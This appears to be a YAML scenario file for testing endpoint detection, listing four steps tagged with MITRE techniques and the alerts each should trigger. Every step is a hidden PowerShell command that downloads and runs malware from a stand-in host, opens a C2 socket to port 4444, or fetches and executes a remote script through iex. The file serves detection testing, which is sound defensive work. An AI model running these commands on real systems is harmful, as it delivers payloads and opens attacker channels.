steps:
- id: step-01
  name: Download Malware via PowerShell
  command: powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'http://192.0.2.10/malware.exe'
    -OutFile 'C:\Users\Public\AppData\Local\Temp\malware.exe'"
  identity: direct
  mitre_technique: T1059.001
  platforms:
  - windows
  expected_detections:
  - plane: EDR
    type: BIOC
    description: Unusual PowerShell Command Execution
    ttp_ref: TTP-0000-0259
    detection_id: bioc-unusual-powershell-command-execution
- id: step-02
  name: Execute Downloaded Malware
  command: powershell -WindowStyle Hidden -Command "Start-Process 'C:\Users\Public\AppData\Local\Temp\malware.exe'"
  identity: direct
  mitre_technique: T1105
  platforms:
  - windows
  expected_detections:
  - plane: EDR
    type: BIOC
    description: Unusual PowerShell Command Execution
    ttp_ref: TTP-0000-0259
    detection_id: bioc-unusual-powershell-command-execution
  causality:
    parent_step: step-01
    pivot: process_lineage
- id: step-03
  name: Establish C2 Connection
  command: powershell -WindowStyle Hidden -Command "$client = New-Object System.Net.Sockets.TCPClient('192.0.2.50',
    4444); $stream = $client.GetStream(); $writer = New-Object System.IO.StreamWriter($stream); $writer.WriteLine('Connected');
    $writer.Flush()"
  identity: direct
  mitre_technique: T1071.004
  platforms:
  - windows
  expected_detections:
  - plane: EDR
    type: ABIOC
    description: Suspicious PowerShell Network Activity
    ttp_ref: TTP-0000-0259
    detection_id: abioc-suspicious-powershell-network-activity
  causality:
    parent_step: step-02
    pivot: process_lineage
- id: step-04
  name: Download and Execute Launcher Script
  command: powershell -WindowStyle Hidden -Command "iex (New-Object Net.WebClient).DownloadString('http://192.0.2.10/launcher.ps1')"
  identity: direct
  mitre_technique: T1059.001
  platforms:
  - windows
  expected_detections:
  - plane: EDR
    type: BIOC
    description: Unusual PowerShell Command Execution
    ttp_ref: TTP-0000-0259
    detection_id: bioc-unusual-powershell-command-execution
  causality:
    parent_step: step-03
    pivot: process_lineage
